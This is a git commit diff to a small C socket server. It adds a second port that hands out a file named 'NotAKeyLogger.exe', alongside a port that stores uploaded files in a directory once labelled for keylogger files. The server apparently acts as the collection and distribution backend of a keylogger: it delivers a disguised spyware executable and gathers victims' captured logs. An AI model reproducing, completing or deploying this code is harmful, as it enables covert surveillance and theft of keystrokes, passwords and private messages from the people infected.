26037913cdc2adfbb598da1910964efb3cb7b38d
DanyLinuxoid <DanyLinuxoid@WorkStation>
2020-05-23 11:13:39 +0300

    changes in server to work with new sending option

--- SmallServer/server.c
+++ SmallServer/server.c
@@ -12,7 +12,6 @@
 #include <time.h> 
 #include <errno.h> // error codes
 #include <fcntl.h>
-#include<pthread.h> // pthread
 
 // Errors Section Start
 const char* Error_Socket_Accept_Failed = "Accept failed\n";
@@ -23,21 +22,33 @@ const char* Error_Socket_Listen_Failed = "Listen failed\n";
 const char* Error_File_Open_Failed = "Failed to open file\n";
 const char* Error_File_Read_Into_Buffer_Failed = "Failed to read file into buffer\n";
 const char* Error_File_Write_Into_FD_Failed = "Failed to write buffer into file desciptor\n";
+const char* Error_Malloc_Failed = "Memory allocation failed\n";
 //Errors Section End
 
 // Define Section Start
-#define MAX_FILE_BUFFERSIZE 8192 // 8MB 
+#ifndef SOL_TCP
+    #define SOL_TCP 6  // socket options TCP level
+#endif
+#ifndef TCP_USER_TIMEOUT
+    #define TCP_USER_TIMEOUT 10  // socket timeout
+#endif
+
+#define MAX_FILE_BUFFERSIZE (1024 * 1024) * 8 // 8MB 
+#define MAX_EXE_BUFFERSIZE 1024 * 1024 // 1MB
 #define MAX_MESSAGE_BUFFERSIZE 128
 #define BINDED_SUCCESS break
 #define DROP_CONNECTION break
 #define ERROR_ENCOUNTERED break
-#define INVALID_SOCKET -1
-#define INVALID_FILE -1
 #define SERVER_IS_UP 1
 #define CONNECTION_IS_UP 1
-#define MASTER_SOCKET_IS_UP 1
+#define SOCKET_IS_UP 1
+#define ERROR_OCCURED 1
+#define SEND 1
 #define ANYPORT 0
 #define TRUE 0
+#define RECEIVE 0
+#define INVALID_SOCKET -1
+#define INVALID_FILE -1
 #define FALSE -1
 // Define Section End
 
@@ -46,14 +57,15 @@ char* GetFileNameWithPathBasedOnCurrentTime();
 char* ConcatTwoStrings(const char *s1, const char *s2, char* buffer);
 char* GetCurrentTime();
 int BindSocket(int sockfd);
-int AcceptConnection(int socket);
-int Prepare_Master_Socket(int* master_socket, struct sockaddr_in* address);
+int AcceptConnection(int max_connection_count, int master_socket, int client_sockets[], struct sockaddr_in address, int addrlen);
+int Prepare_Master_Sockets(int* master_socket, struct sockaddr_in* address, int port);
 void DisplayTime();
-void ReceiveClientFile(int accepted_socket);
 void PrintCustomErrorMessage(int error_code, char* text, char* optionalArgs);
 void WriteToLog(int error_code, const char* message);
 void HandleError(int error_code, const char* message);
 void Reset_Client_Sockets(int client_sockets[], int max_connection_count);
+void RemoveFinishedConnections(int client_sockets[], int max_connection_count, int receive_socket, int send_socket);
+int SendOrReceiveFile(int socket_for_send, int option);
 // Prototype Secton End
 
 // Program entry point
@@ -66,29 +78,30 @@ int main()
     int max_connection_count = 50;
     int client_sockets[max_connection_count]; // array of clients
     int socket_desc;
-    int master_socket;
+    int socket_for_receive;
+    int socket_for_send;
 
-    struct sockaddr_in address; 
-    struct sockaddr_in* address_pointer = &address;
-    address.sin_family = AF_INET;   
-    address.sin_addr.s_addr = INADDR_ANY;   
-    address.sin_port = htons(7145); 
-    int addrlen = sizeof(address);
+    struct sockaddr_in receive_address; 
+    struct sockaddr_in send_address;
 
-    
     while (SERVER_IS_UP)
     {        
-        if (Prepare_Master_Socket(&master_socket, &address) == TRUE)
+        if (Prepare_Master_Sockets(&socket_for_receive, &receive_address, 7145) == TRUE &&
+            Prepare_Master_Sockets(&socket_for_send, &send_address, 7146) == TRUE)
         {
             //clear the socket set  
             Reset_Client_Sockets(client_sockets, max_connection_count);
             FD_ZERO(&readfds); 
 
-            while(MASTER_SOCKET_IS_UP)
+            int addrlen_receive = sizeof(receive_address); 
+            int addrlen_send = sizeof(send_address);
+
+            while(SOCKET_IS_UP)
             {
-                //add master socket to set 
-                FD_SET(master_socket, &readfds);   
-                int max_socket_desc = master_socket;   
+                //add socket to set 
+                FD_SET(socket_for_receive, &readfds);  
+                FD_SET(socket_for_send, &readfds); 
+                int max_socket_desc = socket_for_send;   
                     
                 //add child sockets to set  
                 for (int i = 0; i < max_connection_count; i++)   
@@ -117,57 +130,62 @@ int main()
                     printf("select error\n");   
                 }   
                 
-                //If something happened on the master socket, then it's an incoming connection    
-                if (FD_ISSET(master_socket, &readfds))   
+                //If something happened on the 'receive' socket, then it's an incoming connection (receive) 
+                int receive_socket_to_clean = 0;
+                if (FD_ISSET(socket_for_receive, &readfds))   
                 {   
-                    int new_socket;
-                    if ((new_socket = accept(master_socket, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0)   
-                    {   
-                        HandleError(errno, Error_Socket_Accept_Failed);
-                        close(new_socket);
-                        ERROR_ENCOUNTERED;
-                    }   
-                    
-                    printf("New connection , socket fd is %d , ip is : %s , port : %d  \n", 
-                            new_socket, inet_ntoa(address.sin_addr), ntohs(address.sin_port));   
-                                    
-                    //add new socket to array of sockets  
-                    for (int i = 0; i < max_connection_count; i++)   
-                    {   
-                        //if position is empty  
-                        if (client_sockets[i] == 0)   
-                        {   
-                            client_sockets[i] = new_socket;   
-                            printf("Adding to list of sockets as %d\n" , i);   
-                            break;   
-                        }   
-                    }   
+                    int new_socket = AcceptConnection(max_connection_count, socket_for_receive, client_sockets, receive_address, addrlen_receive);
+                    if (new_socket != INVALID_SOCKET)
+                    {
+                        receive_socket_to_clean = new_socket; // saving client so later we will remove him from list
+                        int recv_size = SendOrReceiveFile(new_socket, RECEIVE);
+                        if (recv_size != ERROR_OCCURED)
+                        {
+                            printf("Received file (%d bytes)\n", recv_size);   
+                        }
+                    }
+
+                    close(new_socket);
                 }   
-                    
-                // receive files from everyone who are waiting
-                int valread;
-                for (int i = 0; i < max_connection_count; i++)   
-                {   
-                    socket_desc = client_sockets[i];   
-                    if (FD_ISSET(socket_desc, &readfds))   
-                    {   
-                        ReceiveClientFile(socket_desc);
-                        printf("Received file, ip %s , port %d \n", inet_ntoa(address.sin_addr), ntohs(address.sin_port));   
-                        client_sockets[i] = 0;   
-                    }   
-                }   
+
+                //or if something happened on the 'send' socket, then client wants to download something (send)
+                int send_socket_to_clean = 0;
+                if (FD_ISSET(socket_for_send, &readfds))
+                {
+                    int new_socket = AcceptConnection(max_connection_count, socket_for_send, client_sockets, send_address, addrlen_send);
+                    if (new_socket != INVALID_SOCKET)
+                    {
+                        send_socket_to_clean = new_socket; // saving client so later we will remove him from list
+                        if(SendOrReceiveFile(new_socket, SEND) != ERROR_OCCURED)
+                        {
+                            printf("Sended file\n");   
+                        }
+                    }
+
+                    close(new_socket);
+                }
+
+                if (send_socket_to_clean != 0 || receive_socket_to_clean != 0) // if there was no errors during accept
+                {
+                    RemoveFinishedConnections(client_sockets, max_connection_count, receive_socket_to_clean, send_socket_to_clean);
+                }
             }
 
             printf("Restarting server...\n");
         }
 
-        close(master_socket);
+        close(socket_for_receive);
+        close(socket_for_send);
     }
 }
 
-// Preparing master socket, head
-int Prepare_Master_Socket(int* master_socket, struct sockaddr_in* address)
+// Preparing master socket
+int Prepare_Master_Sockets(int* master_socket, struct sockaddr_in* address, int port)
 {
+    address->sin_family = AF_INET;   
+    address->sin_addr.s_addr = INADDR_ANY;   
+    address->sin_port = htons(port); 
+
     if ((*master_socket = socket(AF_INET, SOCK_STREAM, 0)) == 0)   
     {   
         HandleError(errno, Error_Socket_Creation_Failed);
@@ -175,7 +193,9 @@ int Prepare_Master_Socket(int* master_socket, struct sockaddr_in* address)
     }     
 
     int opt = 1;
-    if (setsockopt(*master_socket, SOL_SOCKET, SO_REUSEADDR, (int*)&opt, sizeof(int)) < 0)
+    int timeout = 10000;
+    if (setsockopt(*master_socket, SOL_SOCKET, SO_REUSEADDR, (int*)&opt, sizeof(int)) &&
+        setsockopt(*master_socket, SOL_SOCKET, TCP_USER_TIMEOUT, (char*)&timeout, sizeof(timeout)) < 0)
     {
         HandleError(errno, Error_Socket_Option_Set_Failed);
         return FALSE; 
@@ -194,6 +214,55 @@ int Prepare_Master_Socket(int* master_socket, struct sockaddr_in* address)
     }  
 
     return TRUE;
+}
+
+// Accepts incoming connection 
+int AcceptConnection(int max_connection_count, int master_socket, int client_sockets[], struct sockaddr_in address, int addrlen)
+{
+    int new_socket;
+    if ((new_socket = accept(master_socket, (struct sockaddr*)&address, (socklen_t*)&addrlen)) < 0)   
+    {   
+        HandleError(errno, Error_Socket_Accept_Failed);
+        close(new_socket);
+        return INVALID_SOCKET;
+    }   
+    
+    printf("NEW connection, socket: %d, IP: %s, PORT: %d\n", 
+            new_socket, inet_ntoa(address.sin_addr), ntohs(address.sin_port));   
+                    
+    //add new socket to array of sockets  
+    for (int i = 0; i < max_connection_count; i++)   
+    {   
+        //if position is empty  
+        if (client_sockets[i] == 0)   
+        {   
+            client_sockets[i] = new_socket;   
+            break;
+        }   
+    }   
+
+    return new_socket;
+}
+
+// After accepting connections we need to exclude them from list
+void RemoveFinishedConnections(int client_sockets[], int max_connections, int receive_socket, int send_socket)
+{
+    int client_count = 0; 
+    for (int i = 0; i < max_connections; i++)
+    {
+        int potential_client_to_remove = client_sockets[i];
+        if (receive_socket == potential_client_to_remove || send_socket == potential_client_to_remove)
+        {
+            client_sockets[i] = 0;
+        }
+
+        if (client_sockets[i] != 0)
+        {
+            client_count++;
+        }
+    }
+
+    printf("Connection count: %d\n", client_count);
 }
 
 // Sets all sockets to 0
@@ -219,58 +288,114 @@ void DisplayTime()
     printf("Started at %s\n", GetCurrentTime());
 }
 
-// Receives clients file 
-void ReceiveClientFile(int accepted_socket)
+// Handles file receiving and sending 
+int SendOrReceiveFile(int accepted_socket, int option)
 {
-    int filefd = open(GetFileNameWithPathBasedOnCurrentTime(), O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);
-    if (filefd == INVALID_FILE)
-    {
-        HandleError(errno, Error_File_Open_Failed);
-        return;
-    }
-
-    char file_buffer[MAX_FILE_BUFFERSIZE];
-    ssize_t read_return;
+    size_t bytesRed = 0;
     int file_size = 0;
     int error_encountered = 0;
     int cycle_count = 1;
-    do 
+
+    if (option == RECEIVE)
     {
-        printf("Receiving file...\n");
-        read_return = read(accepted_socket, file_buffer, MAX_FILE_BUFFERSIZE);
-        if (cycle_count == 1)
+        char* file_buffer = malloc(MAX_FILE_BUFFERSIZE);
+        if (file_buffer == NULL)
         {
-            file_size = (int)read_return;
+            HandleError(errno, Error_Malloc_Failed);
+            return 1; // error 
         }
 
-        if (read_return == INVALID_FILE)
+        int filefd = open(GetFileNameWithPathBasedOnCurrentTime(), O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);
+        if (filefd == INVALID_FILE)
         {
-            error_encountered = 1;
-            HandleError(errno, Error_File_Read_Into_Buffer_Failed);
-            ERROR_ENCOUNTERED;
+            HandleError(errno, Error_File_Open_Failed);
+            return 1; // error
         }
 
-        if (write(filefd, file_buffer, read_return) == INVALID_FILE)
+        // Receiving option
+        do 
         {
-            error_encountered = 1;
-            HandleError(errno, Error_File_Write_Into_FD_Failed);
-            ERROR_ENCOUNTERED;
+            bytesRed = read(accepted_socket, file_buffer, MAX_FILE_BUFFERSIZE);
+            if (cycle_count == 1)
+            {
+                file_size = (int)bytesRed;
+            }
+
+            if (bytesRed < 0)
+            {
+                error_encountered = 1;
+                HandleError(errno, Error_File_Read_Into_Buffer_Failed);
+                ERROR_ENCOUNTERED;
+            }
+
+            if (write(filefd, file_buffer, bytesRed) == INVALID_FILE)
+            {
+                error_encountered = 1;
+                HandleError(errno, Error_File_Write_Into_FD_Failed);
+                ERROR_ENCOUNTERED;
+            }
+            
+            cycle_count++;
         }
-        
-        cycle_count++;
-    }
-    while(read_return > 0);
+        while(bytesRed > 0);
     
-    if (error_encountered)
-    {
-        printf("Errors during file receive\n");
+        if (error_encountered)
+        {
+            printf("Errors during file receive\n");
+        }
+
+        close(filefd);
+        free(file_buffer);
     }
     else
     {
-        printf("File received (%d bytes)\n", file_size);
-    }
+        char* file_buffer = malloc(MAX_EXE_BUFFERSIZE);
+        if (file_buffer == NULL)
+        {
+            HandleError(errno, Error_Malloc_Failed);
+            return 1;
+        }
+
+        char* exePath = "/home/lin/Desktop/server/executable/NotAKeyLogger.exe"; 
+        FILE* filefd = fopen(exePath, "rb");
+        if (filefd == NULL)
+        {
+            HandleError(errno, Error_File_Open_Failed);
+            return 1;
+        }     
+
+        // Sending option
+        fseek(filefd, 0L, SEEK_END);
+        int size = ftell(filefd);
+        rewind(filefd);
+
+        size_t read_result = fread(file_buffer, 1, size, filefd);
+        if (read_result <= 0)
+        {
+            error_encountered = 1;
+            HandleError(errno, Error_File_Read_Into_Buffer_Failed);
+        }
+        else
+        {
+            while(size > 0)
+            {
+                int sent = write(accepted_socket, file_buffer, size); 
+                if (sent < 0) 
+                {
+                    error_encountered = 1;
+                    HandleError(errno, Error_File_Write_Into_FD_Failed);
+                    ERROR_ENCOUNTERED;
+                }
+
+                size -= sent;
+            }
+        }
+        
+        close(filefd);
+        free(file_buffer);
+    }    
     
-    close(filefd);
+    return error_encountered == 0 ? file_size : error_encountered;
 }
 
 // Concats any 2 strings to one and returns pointer to it (don't use with client input/large dynamic data)
@@ -285,7 +410,7 @@ char* ConcatTwoStrings(const char* string1, const char* string2, char* buffer)
 // File name generator, which prevents any conflicts (example: tuesday 22 2020 13.00.txt)
 char* GetFileNameWithPathBasedOnCurrentTime()
 {
-    char* path = "YOUR PATH WHERE KEYLOGGER FILES WILL BE"; //  SET YOUR DESIRED FILE PATH 
+    char* path = "/home/lin/Desktop/server/client_files/"; //  SET YOUR DESIRED FILE PATH 
     char* name = GetCurrentTime();
     int length = strlen(name);
     for (int i = 0; i < length; i++)
@@ -307,8 +432,8 @@ char* GetFileNameWithPathBasedOnCurrentTime()
 // In case if error occurs, writes error message with time when it occured in log
 void WriteToLog(int error_code, const char* message)
 {
-    int filefd = open("YOUR PATH WHERE LOG WILL BE", O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR); //  SET YOUR DESIRED FILE PATH 
-    if (filefd == INVALID_FILE)
+    FILE* filefd = fopen("/home/lin/Desktop/server/serverlog.txt", "a"); //  SET YOUR DESIRED FILE PATH 
+    if (filefd == NULL)
     {
         perror("Failed to open/create file\n");
         return;
@@ -316,13 +441,13 @@ void WriteToLog(int error_code, const char* message)
 
     char message_to_write[MAX_MESSAGE_BUFFERSIZE];
     sprintf(message_to_write, "%s: %s, %s\n", GetCurrentTime(), strerror(error_code), message);
-    if (write(filefd, message_to_write, strlen(message_to_write)) == INVALID_FILE)
+    if (fputs(message_to_write, filefd) == INVALID_FILE)
     {
         perror(Error_File_Write_Into_FD_Failed);
         return;
     }
 
-    close(filefd);
+    fclose(filefd);
 }
 
 // Small method for error handling, consists of two methods, that are being used often
